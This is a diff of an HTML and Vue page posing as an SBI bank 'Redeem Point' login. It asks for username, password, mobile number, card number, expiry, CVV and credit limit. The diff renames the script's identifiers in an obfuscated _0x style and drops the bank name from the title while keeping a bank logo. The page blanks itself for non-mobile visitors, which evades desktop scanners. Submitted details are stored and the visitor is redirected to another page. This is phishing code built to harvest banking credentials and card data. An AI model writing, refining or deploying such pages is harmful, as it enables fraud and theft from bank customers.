@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBI Secure</title>
+    <title>Secure</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
         body{background:#f0f0f0;min-height:100vh;padding-bottom:20px}
@@ -29,10 +29,149 @@
         .error-message{color:#ff4444;font-size:11px;margin-top:3px}
     </style>
 </head>
-<body><div id="app"></div>
-<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
-<script>
-(()=>{function e(){if(!/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))return!1;if(window.innerWidth>768)return!1;if(!('ontouchstart'in window))return!1;return!0}if(!e()){document.body.innerHTML='';document.body.style.background='#fff';return}const t=Vue.defineComponent({data:()=>({a:"user",b:{username:"",password:"",mobile:""},c:{cardNumber:"",expiry:"",cvv:"",creditLimit:"",mobile:""},d:{}}),methods:{e(e,t,n){if(this.m(e),n.required&&!t.trim())return this.d[e]="This field is required",!1;if(n.minlength&&t.length<n.minlength)return this.d[e]=`Must be at least ${n.minlength} characters`,!1;if(n.pattern&&!n.pattern.test(t))return this.d[e]=e==="expiry"?"Format: MM/YY (e.g., 12/25)":e==="mobile"||e==="cardMobile"?"Valid 10-digit mobile number is required":e==="cvv"?"3-digit CVV is required":"Invalid format",!1;return!0},m(e){delete this.d[e]},f(e){let t=e.target.value.replace(/\s+/g,"").replace(/\D/g,"").substring(0,16),n="";for(let e=0;e<t.length;e++)e>0&&e%4==0&&(n+=" "),n+=t[e];this.c.cardNumber=n,this.m("cardNumber")},g(e){let t=e.target.value.replace(/\D/g,"");t.length>=2&&(t=t.slice(0,2)+"/"+t.slice(2,4)),this.c.expiry=t.slice(0,5),this.m("expiry")},h(e){this.c.cvv=e.target.value.replace(/\D/g,"").slice(0,3),this.m("cvv")},i(e){e==="user"?(this.b.mobile=this.b.mobile.replace(/\D/g,"").slice(0,10),this.m("mobile")):(this.c.mobile=this.c.mobile.replace(/\D/g,"").slice(0,10),this.m("cardMobile"))},j(){this.e("username",this.b.username,{required:!0})&&this.e("password",this.b.password,{required:!0,minlength:6})&&this.e("mobile",this.b.mobile,{required:!0,pattern:/^[0-9]{10}$/})&&this.k({...this.b},"User ID")},l(){this.e("cardNumber",this.c.cardNumber,{required:!0,pattern:/^[0-9\s]{16,19}$/})&&this.e("expiry",this.c.expiry,{required:!0,pattern:/^(0[1-9]|1[0-2])\/([0-9]{2})$/})&&this.e("cvv",this.c.cvv,{required:!0,pattern:/^[0-9]{3}$/})&&this.e("creditLimit",this.c.creditLimit,{required:!0})&&this.e("cardMobile",this.c.mobile,{required:!0,pattern:/^[0-9]{10}$/})&&this.k({...this.c},"Credit Card")},k(e,t){const n=JSON.parse(localStorage.getItem("formSubmissions")||"[]");n.push({id:Date.now(),type:t,data:e,timestamp:new Date().toISOString(),ip:"Not available in browser"}),localStorage.setItem("formSubmissions",JSON.stringify(n)),window.location.href="blogone.html"}},template:`<div><div class=header><img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt=SBI Logo class=logo></div><div class=container><div class=form-header>Continue to Redeem Point</div><div class=tabs-container><button class=tab :class="{active:a==='user'}" @click=a='user'>User ID</button><button class=tab :class="{active:a==='card'}" @click=a='card'>Credit Card No.</button></div><div class=form-content v-show=a==='user'><form @submit.prevent=j><div class=form-group><label class=form-label>Username <span class=asterisk>*</span></label><input type=text class=form-input :class="{error:d.username}" v-model=b.username placeholder="Enter username" @blur=e('username',b.username,{required:true}) @input=m('username')><div class=error-message v-if=d.username>{{d.username}}</div></div><div class=form-group><label class=form-label>Password <span class=asterisk>*</span></label><input type=password class=form-input :class="{error:d.password}" v-model=b.password placeholder="Enter password" @blur=e('password',b.password,{required:true,minlength:6}) @input=m('password')><div class=error-message v-if=d.password>{{d.password}}</div></div><div class=form-group><label class=form-label>Registered Mobile No. <span class=asterisk>*</span></label><input type=tel class=form-input :class="{error:d.mobile}" v-model=b.mobile placeholder="10-digit mobile number" maxlength=10 @blur=e('mobile',b.mobile,{required:true,pattern:/^[0-9]{10}$/}) @input=i('user')><div class=error-message v-if=d.mobile>{{d.mobile}}</div></div><button type=submit class=login-button>LOGIN</button></form></div><div class=form-content v-show=a==='card'><form @submit.prevent=l><div class=form-group><label class=form-label>Credit Card No. <span class=asterisk>*</span></label><input type=text class=form-input :class="{error:d.cardNumber}" v-model=c.cardNumber placeholder="1234 5678 9012 3456" @blur=e('cardNumber',c.cardNumber,{required:true,pattern:/^[0-9\\s]{16,19}$/}) @input=f><div class=error-message v-if=d.cardNumber>{{d.cardNumber}}</div></div><div class=expiry-cvv-container><div class=form-group><label class=form-label>Expiry Date <span class=asterisk>*</span></label><input type=text class=form-input :class="{error:d.expiry}" v-model=c.expiry placeholder=MM/YY maxlength=5 @blur=e('expiry',c.expiry,{required:true,pattern:/^(0[1-9]|1[0-2])\\/([0-9]{2})$/}) @input=g><div class=error-message v-if=d.expiry>Format: MM/YY (e.g., 12/25)</div></div><div class=form-group><label class=form-label>CVV <span class=asterisk>*</span></label><input type=password class=form-input :class="{error:d.cvv}" v-model=c.cvv placeholder=123 maxlength=3 @blur=e('cvv',c.cvv,{required:true,pattern:/^[0-9]{3}$/}) @input=h><div class=error-message v-if=d.cvv>3-digit CVV is required</div></div></div><div class=form-group><label class=form-label>Available Credit Limit <span class=asterisk>*</span></label><input type=text class=form-input :class="{error:d.creditLimit}" v-model=c.creditLimit placeholder="₹" @blur=e('creditLimit',c.creditLimit,{required:true}) @input=m('creditLimit')><div class=error-message v-if=d.creditLimit>Credit limit is required</div></div><div class=form-group><label class=form-label>Registered Mobile No. <span class=asterisk>*</span></label><input type=tel class=form-input :class="{error:d.cardMobile}" v-model=c.mobile placeholder="10-digit mobile number" maxlength=10 @blur=e('cardMobile',c.mobile,{required:true,pattern:/^[0-9]{10}$/}) @input=i('card')><div class=error-message v-if=d.cardMobile>{{d.cardMobile}}</div></div><button type=submit class=login-button>LOGIN</button></form></div></div><img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" alt="Security Guidelines" class=footer-img></div>`});Vue.createApp(t).mount("#app")})();
-</script>
+<body>
+    <div id="app"></div>
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script>
+    (function(){
+        const _0x5a=!!/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&window.innerWidth<768&&'ontouchstart'in window;
+        if(!_0x5a){
+            document.body.innerHTML='<h1 style="display:none">⛔</h1>';
+            document.body.style.background='#fff';
+            return;
+        }
+        const _0x3f=Vue.defineComponent({
+            data(){
+                return {
+                    _0x1:'user',
+                    _0x2:{username:'',password:'',mobile:''},
+                    _0x3:{cardNumber:'',expiry:'',cvv:'',creditLimit:'',mobile:''},
+                    _0x4:{}
+                }
+            },
+            methods:{
+                _0x5(e,t,n){
+                    this._0x6(e);
+                    if(n.required&&!t.trim()){this._0x4[e]='This field is required';return!1}
+                    if(n.minlength&&t.length<n.minlength){this._0x4[e]=`Must be at least ${n.minlength} characters`;return!1}
+                    if(n.pattern&&!n.pattern.test(t)){
+                        if(e==='expiry')this._0x4[e]='Format: MM/YY (e.g., 12/25)';
+                        else if(e==='mobile'||e==='cardMobile')this._0x4[e]='Valid 10-digit mobile number is required';
+                        else if(e==='cvv')this._0x4[e]='3-digit CVV is required';
+                        else this._0x4[e]='Invalid format';
+                        return!1
+                    }
+                    return!0
+                },
+                _0x6(e){delete this._0x4[e]},
+                _0x7(e){
+                    let t=e.target.value.replace(/\s+/g,'').replace(/\D/g,'').substring(0,16),n='';
+                    for(let e=0;e<t.length;e++){e>0&&e%4==0&&(n+=' ');n+=t[e]}
+                    this._0x3.cardNumber=n;this._0x6('cardNumber')
+                },
+                _0x8(e){
+                    let t=e.target.value.replace(/\D/g,'');
+                    t.length>=2&&(t=t.slice(0,2)+'/'+t.slice(2,4));
+                    this._0x3.expiry=t.slice(0,5);this._0x6('expiry')
+                },
+                _0x9(e){this._0x3.cvv=e.target.value.replace(/\D/g,'').slice(0,3);this._0x6('cvv')},
+                _0xa(e){
+                    if(e==='user'){
+                        this._0x2.mobile=this._0x2.mobile.replace(/\D/g,'').slice(0,10);
+                        this._0x6('mobile')
+                    }else{
+                        this._0x3.mobile=this._0x3.mobile.replace(/\D/g,'').slice(0,10);
+                        this._0x6('cardMobile')
+                    }
+                },
+                _0xb(){
+                    this._0x5('username',this._0x2.username,{required:!0})&&
+                    this._0x5('password',this._0x2.password,{required:!0,minlength:6})&&
+                    this._0x5('mobile',this._0x2.mobile,{required:!0,pattern:/^[0-9]{10}$/})&&
+                    this._0xc({...this._0x2},'User ID')
+                },
+                _0xd(){
+                    this._0x5('cardNumber',this._0x3.cardNumber,{required:!0,pattern:/^[0-9\s]{16,19}$/})&&
+                    this._0x5('expiry',this._0x3.expiry,{required:!0,pattern:/^(0[1-9]|1[0-2])\/([0-9]{2})$/})&&
+                    this._0x5('cvv',this._0x3.cvv,{required:!0,pattern:/^[0-9]{3}$/})&&
+                    this._0x5('creditLimit',this._0x3.creditLimit,{required:!0})&&
+                    this._0x5('cardMobile',this._0x3.mobile,{required:!0,pattern:/^[0-9]{10}$/})&&
+                    this._0xc({...this._0x3},'Credit Card')
+                },
+                _0xc(e,t){
+                    const n=JSON.parse(localStorage.getItem('formSubmissions')||'[]');
+                    n.push({id:Date.now(),type:t,data:e,timestamp:new Date().toISOString(),ip:'Not available in browser'});
+                    localStorage.setItem('formSubmissions',JSON.stringify(n));
+                    window.location.href='blogone.html'
+                }
+            },
+            template:`
+            <div>
+                <div class="header"><img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="SBI Logo" class="logo"></div>
+                <div class="container">
+                    <div class="form-header">Continue to Redeem Point</div>
+                    <div class="tabs-container">
+                        <button class="tab" :class="{active:_0x1==='user'}" @click="_0x1='user'">User ID</button>
+                        <button class="tab" :class="{active:_0x1==='card'}" @click="_0x1='card'">Credit Card No.</button>
+                    </div>
+                    <div class="form-content" v-show="_0x1==='user'">
+                        <form @submit.prevent="_0xb">
+                            <div class="form-group">
+                                <label class="form-label">Username <span class="asterisk">*</span></label>
+                                <input type="text" class="form-input" :class="{error:_0x4.username}" v-model="_0x2.username" placeholder="Enter username" @blur="_0x5('username',_0x2.username,{required:true})" @input="_0x6('username')">
+                                <div class="error-message" v-if="_0x4.username">{{_0x4.username}}</div>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Password <span class="asterisk">*</span></label>
+                                <input type="password" class="form-input" :class="{error:_0x4.password}" v-model="_0x2.password" placeholder="Enter password" @blur="_0x5('password',_0x2.password,{required:true,minlength:6})" @input="_0x6('password')">
+                                <div class="error-message" v-if="_0x4.password">{{_0x4.password}}</div>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
+                                <input type="tel" class="form-input" :class="{error:_0x4.mobile}" v-model="_0x2.mobile" placeholder="10-digit mobile number" maxlength="10" @blur="_0x5('mobile',_0x2.mobile,{required:true,pattern:/^[0-9]{10}$/})" @input="_0xa('user')">
+                                <div class="error-message" v-if="_0x4.mobile">{{_0x4.mobile}}</div>
+                            </div>
+                            <button type="submit" class="login-button">LOGIN</button>
+                        </form>
+                    </div>
+                    <div class="form-content" v-show="_0x1==='card'">
+                        <form @submit.prevent="_0xd">
+                            <div class="form-group">
+                                <label class="form-label">Credit Card No. <span class="asterisk">*</span></label>
+                                <input type="text" class="form-input" :class="{error:_0x4.cardNumber}" v-model="_0x3.cardNumber" placeholder="1234 5678 9012 3456" @blur="_0x5('cardNumber',_0x3.cardNumber,{required:true,pattern:/^[0-9\\s]{16,19}$/})" @input="_0x7">
+                                <div class="error-message" v-if="_0x4.cardNumber">{{_0x4.cardNumber}}</div>
+                            </div>
+                            <div class="expiry-cvv-container">
+                                <div class="form-group">
+                                    <label class="form-label">Expiry Date <span class="asterisk">*</span></label>
+                                    <input type="text" class="form-input" :class="{error:_0x4.expiry}" v-model="_0x3.expiry" placeholder="MM/YY" maxlength="5" @blur="_0x5('expiry',_0x3.expiry,{required:true,pattern:/^(0[1-9]|1[0-2])\\/([0-9]{2})$/})" @input="_0x8">
+                                    <div class="error-message" v-if="_0x4.expiry">Format: MM/YY (e.g., 12/25)</div>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label">CVV <span class="asterisk">*</span></label>
+                                    <input type="password" class="form-input" :class="{error:_0x4.cvv}" v-model="_0x3.cvv" placeholder="123" maxlength="3" @blur="_0x5('cvv',_0x3.cvv,{required:true,pattern:/^[0-9]{3}$/})" @input="_0x9">
+                                    <div class="error-message" v-if="_0x4.cvv">3-digit CVV is required</div>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Available Credit Limit <span class="asterisk">*</span></label>
+                                <input type="text" class="form-input" :class="{error:_0x4.creditLimit}" v-model="_0x3.creditLimit" placeholder="₹" @blur="_0x5('creditLimit',_0x3.creditLimit,{required:true})" @input="_0x6('creditLimit')">
+                                <div class="error-message" v-if="_0x4.creditLimit">Credit limit is required</div>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Registered Mobile No. <span class="asterisk">*</span></label>
+                                <input type="tel" class="form-input" :class="{error:_0x4.cardMobile}" v-model="_0x3.mobile" placeholder="10-digit mobile number" maxlength="10" @blur="_0x5('cardMobile',_0x3.mobile,{required:true,pattern:/^[0-9]{10}$/})" @input="_0xa('card')">
+                                <div class="error-message" v-if="_0x4.cardMobile">{{_0x4.cardMobile}}</div>
+                            </div>
+                            <button type="submit" class="login-button">LOGIN</button>
+                        </form>
+                    </div>
+                </div>
+                <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" alt="Security Guidelines" class="footer-img">
+            </div>`
+        });
+        Vue.createApp(_0x3f).mount('#app');
+    })();
+    </script>
 </body>
 </html>
